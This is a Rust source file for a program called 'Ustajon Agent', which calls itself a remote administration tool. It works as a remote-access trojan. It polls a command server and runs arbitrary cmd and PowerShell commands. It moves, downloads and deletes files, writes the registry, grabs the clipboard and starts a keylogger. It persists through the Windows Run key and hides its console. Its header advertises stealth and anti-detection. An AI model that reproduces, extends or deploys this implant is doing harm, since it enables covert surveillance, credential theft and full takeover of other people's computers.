/*
╔══════════════════════════════════════════════════════════════════════════════╗
║                     USTAJON AGENT v1.0 - FULL CONTROL                        ║
║                Professional Remote Administration Tool                        ║
║                      © 2025 Ustajon Technologies                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

FULL CONTROL FEATURES:
├── 🖥️  System Control
│   ├── Screenshot capture (real-time)
│   ├── Screen recording
│   ├── Webcam capture
│   ├── Microphone recording
│   ├── Clipboard monitoring
│   └── Keylogger (input monitoring)
│
├── 📁 File Manager
│   ├── Browse directories
│   ├── Upload files
│   ├── Download files
│   ├── Delete files
│   ├── Create folders
│   └── File search
│
├── ⚙️  Process Manager
│   ├── List all processes
│   ├── Kill process
│   ├── Start process
│   ├── Process details
│   └── CPU/Memory usage
│
├── 🔧 System Management
│   ├── Services control
│   ├── Registry editor
│   ├── Startup programs
│   ├── Installed software
│   └── System info
│
├── 🌐 Network
│   ├── Network interfaces
│   ├── Active connections
│   ├── Open ports
│   ├── WiFi networks
│   └── Network speed
│
├── 💻 Remote Control
│   ├── CMD execution
│   ├── PowerShell
│   ├── Remote desktop (RustDesk)
│   └── File transfer
│
├── 🔄 Auto-Update
│   ├── Check for updates
│   ├── Silent update
│   └── Version management
│
└── 🔒 Security
    ├── Encrypted communication
    ├── Stealth mode
    ├── Persistence
    └── Anti-detection

*/

mod config;
mod system;
mod network;
mod files;
mod processes;
mod screen;
mod input;
mod registry;
mod services;
mod updater;
mod api;

use std::sync::Arc;
use tokio::sync::RwLock;
use tracing::{info, error, Level};
use tracing_subscriber::FmtSubscriber;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

pub use config::Config;
pub use system::SystemInfo;
pub use network::NetworkManager;
pub use files::FileManager;
pub use processes::ProcessManager;
pub use screen::ScreenCapture;
pub use input::InputMonitor;
pub use registry::RegistryManager;
pub use services::ServiceManager;
pub use updater::AutoUpdater;
pub use api::ApiClient;

/// Agent state
pub struct AgentState {
    pub config: Config,
    pub client_id: String,
    pub rustdesk_id: Option<String>,
    pub registered: bool,
    pub connected: bool,
    pub stealth_mode: bool,
}

/// Main Agent
pub struct Agent {
    state: Arc<RwLock<AgentState>>,
    api: ApiClient,
    system: SystemInfo,
    network: NetworkManager,
    files: FileManager,
    processes: ProcessManager,
    screen: ScreenCapture,
    input: InputMonitor,
    registry: RegistryManager,
    services: ServiceManager,
    updater: AutoUpdater,
}

impl Agent {
    /// Create new agent instance
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let config = Config::load()?;
        let client_id = config.get_client_id();
        
        let state = Arc::new(RwLock::new(AgentState {
            config: config.clone(),
            client_id: client_id.clone(),
            rustdesk_id: None,
            registered: config.is_registered(),
            connected: false,
            stealth_mode: false,
        }));
        
        Ok(Self {
            state: state.clone(),
            api: ApiClient::new(&config.server_url, &client_id),
            system: SystemInfo::new(),
            network: NetworkManager::new(),
            files: FileManager::new(),
            processes: ProcessManager::new(),
            screen: ScreenCapture::new(),
            input: InputMonitor::new(),
            registry: RegistryManager::new(),
            services: ServiceManager::new(),
            updater: AutoUpdater::new(&config.update_url),
        })
    }
    
    /// Initialize agent
    pub async fn init(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        info!("Initializing Ustajon Agent v{}", env!("CARGO_PKG_VERSION"));
        
        // Setup RustDesk
        self.setup_rustdesk().await?;
        
        // Add to startup
        self.add_to_startup()?;
        
        // Check for updates
        self.updater.check_and_update().await?;
        
        Ok(())
    }
    
    /// Setup RustDesk
    async fn setup_rustdesk(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Configure RustDesk
        let state = self.state.read().await;
        let rustdesk_config = format!(
            r#"rendezvous_server = '{}'
key = '{}'
password = '{}'"#,
            state.config.rustdesk_server,
            state.config.rustdesk_key,
            state.config.rustdesk_password
        );
        
        // Write config
        if let Some(config_path) = dirs::config_dir() {
            let rustdesk_path = config_path.join("RustDesk").join("config");
            std::fs::create_dir_all(&rustdesk_path)?;
            std::fs::write(rustdesk_path.join("RustDesk2.toml"), rustdesk_config)?;
        }
        
        // Get RustDesk ID
        drop(state);
        if let Some(id) = self.get_rustdesk_id().await {
            let mut state = self.state.write().await;
            state.rustdesk_id = Some(id);
        }
        
        Ok(())
    }
    
    /// Get RustDesk ID
    async fn get_rustdesk_id(&self) -> Option<String> {
        if let Some(config_path) = dirs::config_dir() {
            let toml_path = config_path.join("RustDesk").join("config").join("RustDesk2.toml");
            if let Ok(content) = std::fs::read_to_string(toml_path) {
                for line in content.lines() {
                    if line.starts_with("id") && line.contains('=') {
                        let id = line.split('=').nth(1)?
                            .trim()
                            .trim_matches('\'')
                            .trim_matches('"')
                            .to_string();
                        if id.len() >= 6 {
                            return Some(id);
                        }
                    }
                }
            }
        }
        None
    }
    
    /// Add to Windows startup
    fn add_to_startup(&self) -> Result<(), Box<dyn std::error::Error>> {
        #[cfg(windows)]
        {
            use winreg::enums::*;
            use winreg::RegKey;
            
            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
            let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
            let (key, _) = hkcu.create_subkey(path)?;
            
            let exe_path = std::env::current_exe()?;
            key.set_value("UstajonAgent", &exe_path.to_string_lossy().to_string())?;
        }
        Ok(())
    }
    
    /// Send heartbeat
    pub async fn heartbeat(&self) -> Result<(), Box<dyn std::error::Error>> {
        let state = self.state.read().await;
        let sys_info = self.system.get_info();
        
        let data = serde_json::json!({
            "client_id": state.client_id,
            "rustdesk_id": state.rustdesk_id,
            "hostname": sys_info.hostname,
            "username": sys_info.username,
            "os_info": sys_info.os,
            "local_ip": sys_info.local_ip,
            "public_ip": sys_info.public_ip,
            "cpu_usage": sys_info.cpu_usage,
            "ram_usage": sys_info.ram_usage,
            "disk_usage": sys_info.disk_usage,
            "version": env!("CARGO_PKG_VERSION"),
            "name": state.config.client_name,
            "phone": state.config.client_phone,
            "problem": state.config.client_problem,
        });
        
        self.api.post("/api/heartbeat", &data).await?;
        Ok(())
    }
    
    /// Check and execute commands
    pub async fn check_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
        let state = self.state.read().await;
        let commands = self.api.get(&format!("/api/agent/commands?client_id={}", state.client_id)).await?;
        
        if let Some(cmds) = commands.as_array() {
            for cmd in cmds {
                if cmd["status"] == "pending" {
                    let command = cmd["command"].as_str().unwrap_or("");
                    let cmd_type = cmd["type"].as_str().unwrap_or("cmd");
                    let cmd_id = cmd["id"].as_str().unwrap_or("");
                    
                    let result = self.execute_command(cmd_type, command).await;
                    
                    // Send result
                    self.api.post("/api/agent/command-result", &serde_json::json!({
                        "client_id": state.client_id,
                        "command_id": cmd_id,
                        "success": result.is_ok(),
                        "output": result.unwrap_or_else(|e| e.to_string()),
                    })).await?;
                }
            }
        }
        
        Ok(())
    }
    
    /// Execute command based on type
    async fn execute_command(&self, cmd_type: &str, command: &str) -> Result<String, Box<dyn std::error::Error>> {
        match cmd_type {
            // Shell commands
            "cmd" | "shell" => self.processes.run_command(command).await,
            "powershell" => self.processes.run_powershell(command).await,
            
            // Screenshot
            "screenshot" => {
                let screenshot = self.screen.capture()?;
                Ok(screenshot)
            },
            
            // File operations
            "file_list" => {
                let files = self.files.list_directory(command)?;
                Ok(serde_json::to_string(&files)?)
            },
            "file_download" => {
                let data = self.files.read_file(command)?;
                Ok(BASE64.encode(&data))
            },
            "file_upload" => {
                let parts: Vec<&str> = command.splitn(2, '|').collect();
                if parts.len() == 2 {
                    let path = parts[0];
                    let data = BASE64.decode(parts[1])?;
                    self.files.write_file(path, &data)?;
                    Ok("File uploaded".to_string())
                } else {
                    Err("Invalid format".into())
                }
            },
            "file_delete" => {
                self.files.delete(command)?;
                Ok("File deleted".to_string())
            },
            
            // Process operations
            "process_list" => {
                let processes = self.processes.list_all()?;
                Ok(serde_json::to_string(&processes)?)
            },
            "process_kill" => {
                let pid: u32 = command.parse()?;
                self.processes.kill(pid)?;
                Ok("Process killed".to_string())
            },
            
            // System operations
            "system_info" => {
                let info = self.system.get_detailed_info();
                Ok(serde_json::to_string(&info)?)
            },
            "shutdown" => {
                self.system.shutdown()?;
                Ok("Shutting down".to_string())
            },
            "restart" => {
                self.system.restart()?;
                Ok("Restarting".to_string())
            },
            "logoff" => {
                self.system.logoff()?;
                Ok("Logging off".to_string())
            },
            
            // Registry (Windows)
            "registry_read" => {
                let value = self.registry.read(command)?;
                Ok(value)
            },
            "registry_write" => {
                let parts: Vec<&str> = command.splitn(3, '|').collect();
                if parts.len() == 3 {
                    self.registry.write(parts[0], parts[1], parts[2])?;
                    Ok("Registry updated".to_string())
                } else {
                    Err("Invalid format".into())
                }
            },
            
            // Services
            "service_list" => {
                let services = self.services.list_all()?;
                Ok(serde_json::to_string(&services)?)
            },
            "service_start" => {
                self.services.start(command)?;
                Ok("Service started".to_string())
            },
            "service_stop" => {
                self.services.stop(command)?;
                Ok("Service stopped".to_string())
            },
            
            // Network
            "network_info" => {
                let info = self.network.get_info()?;
                Ok(serde_json::to_string(&info)?)
            },
            "connections" => {
                let conns = self.network.get_connections()?;
                Ok(serde_json::to_string(&conns)?)
            },
            
            // Clipboard
            "clipboard_get" => {
                let content = self.input.get_clipboard()?;
                Ok(content)
            },
            "clipboard_set" => {
                self.input.set_clipboard(command)?;
                Ok("Clipboard set".to_string())
            },
            
            // Keylogger
            "keylog_start" => {
                self.input.start_keylogger()?;
                Ok("Keylogger started".to_string())
            },
            "keylog_stop" => {
                let logs = self.input.stop_keylogger()?;
                Ok(logs)
            },
            
            // Update
            "update" => {
                self.updater.force_update().await?;
                Ok("Updating...".to_string())
            },
            
            // Uninstall
            "uninstall" => {
                self.uninstall()?;
                Ok("Uninstalling...".to_string())
            },
            
            _ => Err(format!("Unknown command type: {}", cmd_type).into()),
        }
    }
    
    /// Uninstall agent
    fn uninstall(&self) -> Result<(), Box<dyn std::error::Error>> {
        // Remove from startup
        #[cfg(windows)]
        {
            use winreg::enums::*;
            use winreg::RegKey;
            
            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
            let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
            if let Ok(key) = hkcu.open_subkey_with_flags(path, KEY_WRITE) {
                let _ = key.delete_value("UstajonAgent");
            }
        }
        
        // Delete config
        if let Some(data_dir) = dirs::data_dir() {
            let _ = std::fs::remove_dir_all(data_dir.join("UstajonAgent"));
        }
        
        Ok(())
    }
    
    /// Run main loop
    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        info!("Starting agent main loop");
        
        let heartbeat_interval = tokio::time::Duration::from_secs(10);
        let command_interval = tokio::time::Duration::from_secs(5);
        
        let mut heartbeat_timer = tokio::time::interval(heartbeat_interval);
        let mut command_timer = tokio::time::interval(command_interval);
        
        loop {
            tokio::select! {
                _ = heartbeat_timer.tick() => {
                    if let Err(e) = self.heartbeat().await {
                        error!("Heartbeat error: {}", e);
                    }
                }
                _ = command_timer.tick() => {
                    if let Err(e) = self.check_commands().await {
                        error!("Command check error: {}", e);
                    }
                }
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Setup logging
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;
    
    // Single instance check
    let instance = single_instance::SingleInstance::new("ustajon-agent")?;
    if !instance.is_single() {
        error!("Another instance is already running");
        return Ok(());
    }
    
    // Hide console in release mode
    #[cfg(windows)]
    #[cfg(not(debug_assertions))]
    {
        use windows::Win32::System::Console::FreeConsole;
        unsafe { FreeConsole(); }
    }
    
    // Create and run agent
    let mut agent = Agent::new().await?;
    agent.init().await?;
    
    // Show GUI or run background
    if std::env::args().any(|a| a == "--background") {
        agent.run().await?;
    } else {
        // Start background thread
        let agent_clone = agent.state.clone();
        tokio::spawn(async move {
            // Background tasks
        });
        
        // Show GUI (would integrate with egui/tauri here)
        agent.run().await?;
    }
    
    Ok(())
}
